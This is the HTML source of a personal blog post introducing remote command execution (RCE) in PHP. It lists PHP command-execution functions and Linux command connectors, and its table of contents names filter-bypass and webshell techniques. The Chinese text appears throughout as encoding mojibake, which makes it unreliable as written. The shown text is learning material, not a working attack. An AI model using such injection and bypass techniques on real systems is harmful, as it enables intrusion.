<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;zh-CN&quot;,&quot;default&quot;]"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="Npc"><meta name="copyright" content="Npc"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>ÂàùËØÜRCE | Npc | Blog</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/plugins/line-numbers/prism-line-numbers.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.css"><script src="https://cdn.jsdelivr.net/npm/my_blog_prism@1.0.5/prism.js"></script><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"npc0vo.github.io","root":"/","title":"NpcÂ∞èÁ´ô","version":"1.10.11","mode":"light","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://waline-onelastchicks-projects.vercel.app/","comment":false,"el":"#waline","lang":["en","zh-CN","default"]},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="Reference ËøúÁ®ãÂëΩ‰ª§&#x2F;‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºàRCEÔºâÊÄªÁªì_ÂèØËÉΩÈÄ†ÊàêËøúÁ®ã‰ª£Á†ÅÊâßË°åÁöÑÂáΩÊï∞-CSDNÂçöÂÆ¢ „ÄêÂéüÂàõ„ÄëÂü∫Á°ÄÁØá ‚Äì RCEÊºèÊ¥ûÊÄªÁªì-ËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÁ§æÂå∫-ËÖæËÆØ‰∫ë (tencent.com) Êó†Â≠óÊØçÊï∞Â≠ówebshellÊÄªÁªì - ÂÖàÁü•Á§æÂå∫ (aliyun.com)  ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞  PHP system(string [command],int [result_code]&#x3D;null):string">
<meta property="og:type" content="article">
<meta property="og:title" content="ÂàùËØÜRCE">
<meta property="og:url" content="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86RCE/index.html">
<meta property="og:site_name" content="Npc | Blog">
<meta property="og:description" content="Reference ËøúÁ®ãÂëΩ‰ª§&#x2F;‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºàRCEÔºâÊÄªÁªì_ÂèØËÉΩÈÄ†ÊàêËøúÁ®ã‰ª£Á†ÅÊâßË°åÁöÑÂáΩÊï∞-CSDNÂçöÂÆ¢ „ÄêÂéüÂàõ„ÄëÂü∫Á°ÄÁØá ‚Äì RCEÊºèÊ¥ûÊÄªÁªì-ËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÁ§æÂå∫-ËÖæËÆØ‰∫ë (tencent.com) Êó†Â≠óÊØçÊï∞Â≠ówebshellÊÄªÁªì - ÂÖàÁü•Á§æÂå∫ (aliyun.com)  ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞  PHP system(string [command],int [result_code]&#x3D;null):string">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86RCE/image-20240630220706399.png">
<meta property="og:image" content="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86RCE/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86RCE/image-20240630212739228.png">
<meta property="article:published_time" content="2024-06-30T05:05:53.000Z">
<meta property="article:modified_time" content="2024-07-24T07:14:03.898Z">
<meta property="article:author" content="Npc">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86RCE/image-20240630220706399.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="Npc"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="Npc"><span class="site-author-status">üò≠</span></a><div class="site-author-name"><a href="/about/">Npc</a></div><span class="site-name">Npc | Blog</span><sub class="site-subtitle">ÊÉ≥s</sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">68</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">10</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">14</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ÁïôË®ÄÊùø"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/npc0vo" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:me@1930278836@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://www.yuque.com/npc0vo" title="Yuque" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:yuque"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="ÊàëÁöÑÂ∞è‰ºô‰º¥‰ª¨" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">1.</span> <span class="toc-text"> Reference</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text"> ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php"><span class="toc-number">2.1.</span> <span class="toc-text"> PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux%E8%BF%9E%E6%8E%A5%E7%AC%A6"><span class="toc-number">2.2.</span> <span class="toc-text"> LinuxËøûÊé•Á¨¶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">3.</span> <span class="toc-text"> ÁªïËøáÊäÄÂ∑ß</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E8%BF%87%E6%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text"> Á©∫Ê†ºËøáÊª§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">3.2.</span> <span class="toc-text"> ÂÖ≥ÈîÆÂ≠óËøáÊª§</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E6%9B%BF"><span class="toc-number">3.2.1.</span> <span class="toc-text"> ‰ª£Êõø</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BD%AC%E4%B9%89%E7%AC%A6"><span class="toc-number">3.2.2.</span> <span class="toc-text"> ËΩ¨‰πâÁ¨¶</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%85%E8%81%94"><span class="toc-number">3.2.3.</span> <span class="toc-text"> ÂÜÖËÅî</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.4.</span> <span class="toc-text"> ÁºñÁ†ÅËøõÂà∂ÁªïËøá</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.5.</span> <span class="toc-text"> ËøáÊª§Êñá‰ª∂ÂêçÁªïËøá</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#system%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.6.</span> <span class="toc-text"> system()ÁªïËøá</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%8F%98%E9%87%8F"><span class="toc-number">3.2.7.</span> <span class="toc-text"> ÁâπÊÆäÂèòÈáè</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text"> ËøáÊª§&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">3.4.</span> <span class="toc-text"> ËøáÊª§ÂàÜÈöîÁ¨¶|&amp;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">3.5.</span> <span class="toc-text"> ÈïøÂ∫¶ÈôêÂà∂*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">3.6.</span> <span class="toc-text"> Êó†ÂõûÊòæ</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#shell_exec%E7%AD%89%E6%97%A0%E5%9B%9E%E6%98%BE%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.1.</span> <span class="toc-text"> shell_execÁ≠âÊó†ÂõûÊòæÂáΩÊï∞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#devnull-21%E7%B1%BB%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">3.6.2.</span> <span class="toc-text"> &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1Á±ªÊó†ÂõûÊòæ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perl%E4%B8%AD%E7%9A%84open%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.7.</span> <span class="toc-text"> Perl‰∏≠ÁöÑopenÂëΩ‰ª§ÊâßË°å</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dwebshell"><span class="toc-number">3.8.</span> <span class="toc-text"> Êó†Êï∞Â≠óÂ≠óÊØçwebshell*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.9.</span> <span class="toc-text"> ËøáÊª§Êã¨Âè∑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0rce"><span class="toc-number">3.10.</span> <span class="toc-text"> Êó†ÂèÇÊï∞RCE*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open_basedir%E7%BB%95%E8%BF%87"><span class="toc-number">3.11.</span> <span class="toc-text"> open_basedirÁªïËøá*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#disable_function%E7%BB%95%E8%BF%87"><span class="toc-number">3.12.</span> <span class="toc-text"> disable_functionÁªïËøá*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">3.13.</span> <span class="toc-text"> ÈÄöÈÖçÁ¨¶ÁªïËøá</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#grep%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-number">3.14.</span> <span class="toc-text"> grepÁªïËøáÂÖ≥ÈîÆËØçËøáÊª§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8~%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="toc-number">3.15.</span> <span class="toc-text"> ‰ΩøÁî®~$()ÊûÑÈÄ†Êï∞Â≠ó</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%86%85%E7%BD%AE%E7%B1%BBrce"><span class="toc-number">3.16.</span> <span class="toc-text"> phpÂÜÖÁΩÆÁ±ªRce*</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#path%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-number">3.17.</span> <span class="toc-text"> $PATHÁéØÂ¢ÉÂèòÈáèÁªïËøá</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%86%99%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%92%8C"><span class="toc-number">3.17.1.</span> <span class="toc-text"> ÂèØ‰ª•‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÊï∞Â≠óÂíå{}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E5%A4%A7%E5%86%99%E5%AD%97%E6%AF%8D%E5%92%8C"><span class="toc-number">3.17.2.</span> <span class="toc-text"> ÂèØ‰ª•‰ΩøÁî®Â§ßÂÜôÂ≠óÊØçÂíå{}</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://npc0vo.github.io/2024/06/30/%E5%88%9D%E8%AF%86RCE/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Npc"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Npc | Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ÂàùËØÜRCE</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2024-06-30 13:05:53" itemprop="dateCreated datePublished" datetime="2024-06-30T13:05:53+08:00">2024-06-30</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2024-07-24 15:14:03" itemprop="dateModified" datetime="2024-07-24T15:14:03+08:00">2024-07-24</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">2.7k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">11m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Web/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Web</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/Web/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">Web</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="reference"><a class="markdownIt-Anchor" href="#reference"></a> Reference</h2>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/nigo134/article/details/118462599">ËøúÁ®ãÂëΩ‰ª§/‰ª£Á†ÅÊâßË°åÊºèÊ¥ûÔºàRCEÔºâÊÄªÁªì_ÂèØËÉΩÈÄ†ÊàêËøúÁ®ã‰ª£Á†ÅÊâßË°åÁöÑÂáΩÊï∞-CSDNÂçöÂÆ¢</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1668900">„ÄêÂéüÂàõ„ÄëÂü∫Á°ÄÁØá ‚Äì RCEÊºèÊ¥ûÊÄªÁªì-ËÖæËÆØ‰∫ëÂºÄÂèëËÄÖÁ§æÂå∫-ËÖæËÆØ‰∫ë (tencent.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8107?time__1311=n4%2BxuDgDBDyGD%3DDOFD%2FD0ioQ4%2BPsFD9CAeoD&amp;alichlgref=https%3A%2F%2Flink.csdn.net%2F%3Ftarget%3Dhttps%3A%2F%2Fxz.aliyun.com%2Ft%2F8107">Êó†Â≠óÊØçÊï∞Â≠ówebshellÊÄªÁªì - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a></p>
<h2 id="ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞"><a class="markdownIt-Anchor" href="#ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞"></a> ÂëΩ‰ª§ÊâßË°åÂáΩÊï∞</h2>
<h3 id="php"><a class="markdownIt-Anchor" href="#php"></a> PHP</h3>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token keyword type-declaration">string</span> <span class="token punctuation">[</span>command<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword type-declaration">int</span> <span class="token punctuation">[</span>result_code<span class="token punctuation">]</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword return-type">string</span> <span class="token operator">|</span> <span class="token class-name">status</span><span class="token comment">//ÊâßË°åÂ§ñÈÉ®Á®ãÂ∫èÔºåÂπ∂‰∏îËøîÂõûÂëΩ‰ª§ËæìÂá∫ÁöÑÊúÄÂêé‰∏ÄË°åËæìÂá∫</span>
<span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword type-declaration">string</span><span class="token punctuation">[</span>command<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword type-declaration">array</span><span class="token punctuation">[</span>output<span class="token punctuation">]</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">,</span><span class="token keyword type-declaration">int</span><span class="token punctuation">[</span>result_code<span class="token punctuation">]</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword return-type">string</span><span class="token operator">|</span><span class="token class-name">status</span><span class="token comment">//ÊâßË°åÂ§ñÈÉ®Á®ãÂ∫èÔºå‰ΩÜÊòØËæìÂá∫ÊâßË°åÁªìÊûúÁöÑÊúÄÂêé‰∏ÄË°åÂÜÖÂÆπ</span>
<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token keyword type-declaration">string</span><span class="token punctuation">[</span>command<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword type-declaration">int</span><span class="token punctuation">[</span>result_code<span class="token punctuation">]</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">null</span><span class="token operator">?</span><span class="token constant boolean">false</span><span class="token comment">//ÊâßË°åÂ§ñÈÉ®Á®ãÂ∫èÔºåÂπ∂‰∏îÊòæÁ§∫ÂéüÂßãËæìÂá∫</span>
<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//ÊääÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫php‰ª£Á†ÅÊâßË°åÔºåÊó†ÂõûÊòæ</span>
<span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token keyword type-declaration">string</span><span class="token punctuation">[</span>command<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment">//ÈÄöËøáshellÊâßË°åÂëΩ‰ª§ÔºåÂπ∂Â∞ÜÂÆåÊï¥ÁöÑËæìÂá∫‰ª•Â≠óÁ¨¶‰∏≤ÁöÑÊñπÂºèËøîÂõû</span>
<span class="token string backtick-quoted-string">`command`</span><span class="token comment">//ÂèçÂºïÂè∑Âú®php‰∏≠Á≠âÂêå‰∫éshell_exec()ÔºåÂ∞ÜÂèçÂºïÂè∑‰∏≠ÁöÑÂÜÖÂÆπ‰Ωú‰∏∫shellÂëΩ‰ª§Êù•ÊâßË°åÔºåÂπ∂‰∏îËæìÂá∫‰ø°ÊÅØËøîÂõû„ÄÇÂ¶ÇÊûúË¶ÅÁúãÂà∞ËæìÂá∫ÁöÑ‰ø°ÊÅØÔºåÈúÄË¶ÅÁî®echoÊàñËÄÖprintÊù•ÂåÖË£π‰ªñ„ÄÇ </span>
<span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token keyword type-declaration">string</span> <span class="token punctuation">[</span>arg<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword return-type">string</span><span class="token comment">//ËΩ¨‰πâÂ≠óÁ¨¶‰∏≤‰ª•Áî®‰ΩúshellÂèÇÊï∞„ÄÇÂú®Â≠óÁ¨¶‰∏≤Âë®Âõ¥Ê∑ªÂä†ÂçïÂºïÂè∑ÔºåÂπ∂‰∏îËΩ¨‰πâÁé∞ÊúâÁöÑÂçïÂºïÂè∑ÔºàËá™Âä®ËΩ¨‰πâÔºâÔºåËøûÁª≠ÁöÑÂèçÊñúÊù†ËøòÊúâ‰ºöÈ¢ùÂ§ñÁöÑÂèçÊñúÊù†ËΩ¨‰πâ„ÄÇËøîÂõûËΩ¨‰πâÁöÑÂ≠óÁ¨¶‰∏≤Ôºå‰∏ªË¶ÅÁî®Êù•ËΩ¨‰πâshellÂáΩÊï∞ÁöÑÂèÇÊï∞</span>
<span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token keyword type-declaration">string</span><span class="token punctuation">[</span>command<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword return-type">string</span><span class="token comment">//Â∞±ÊòØÂä†‰∫Ü‰∏™ËΩ¨‰πâÁ¨¶Âíå‰∏äÈù¢‰∏ÄÊ†∑ÈÉΩÂè™ÊúâËΩ¨‰πâÁöÑÂäüËÉΩ‰ª•‰∏ãÂ≠óÁ¨¶ÂâçÈù¢Êúâ‰∏Ä‰∏™ÂèçÊñúÊù†Ôºö &amp;#;|*?~&lt;>^()[]&#123;&#125;$\¬∑\x0A Âíå\xFF„ÄÇ</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>Ê≥®ÊÑèÔºåeval‰∏çËÉΩÂåÖÂê´ÊâìÂºÄ/ÂÖ≥Èó≠ÁöÑphp tagsÔºåÂ∞±ÊòØ‰∏çËÉΩÂåÖÂê´ÂÆåÊï¥ÁöÑÔºå‰ΩÜÊòØÂèØ‰ª•Áî®Ôºü&gt;xxxxxx&lt;?phpËøôÁßç„ÄÇÈô§Ê≠§‰πãÂ§ñÔºå‰º†ÂÖ•ÁöÑÂøÖÈ°ªÊòØÊúâÊïàÁöÑphp‰ª£Á†ÅÔºåË¶Å‰ª•ÂàÜÂè∑ÁªìÂ∞æ„ÄÇ</li>
<li>ÊúÄÂêé‰∏§‰∏™‰∏ÄËà¨‰∏é<code>system</code>‰∏ÄËµ∑‰ΩøÁî®ÔºåÊ≤°ÊúâÊâßË°åÂäüËÉΩ</li>
</ul>
<h3 id="linuxËøûÊé•Á¨¶"><a class="markdownIt-Anchor" href="#linuxËøûÊé•Á¨¶"></a> LinuxËøûÊé•Á¨¶</h3>
<ul>
<li>
<p><code>&amp;</code>‰ΩøÂëΩ‰ª§Âú®ÂêéÂè∞ËøêË°å</p>
<p><code>ping baidu.com &amp;</code></p>
</li>
<li>
<p><code>;</code>ËøûÊé•ÂëΩ‰ª§</p>
</li>
<li>
<p><code>&amp;&amp;</code>‰∏éÊìç‰ΩúÁ¨¶ÔºåÁ¨¨‰∏Ä‰∏™ÂëΩ‰ª§ÊàêÂäüÊâçÂèØ‰ª•ÊâßË°åÁ¨¨‰∫å‰∏™ÂëΩ‰ª§</p>
<p><code>ping -c3 www.baidu.com&amp;&amp;links www.baidu.com</code></p>
</li>
<li>
<p><code>||</code>ÊàñÊìç‰ΩúÁ¨¶ÔºåÁ¨¨‰∏Ä‰∏™Â§±Ë¥•ÁöÑÊÉÖÂÜµ‰∏ãÊâßË°åÁ¨¨‰∫å‰∏™ÂëΩ‰ª§Ôºå‰∏çÁÑ∂Â∞±Âè™ÊâßË°åÁ¨¨‰∏Ä‰∏™ÂëΩ‰ª§</p>
</li>
<li>
<p><code>|</code>ÁÆ°ÈÅìÁ¨¶</p>
</li>
</ul>
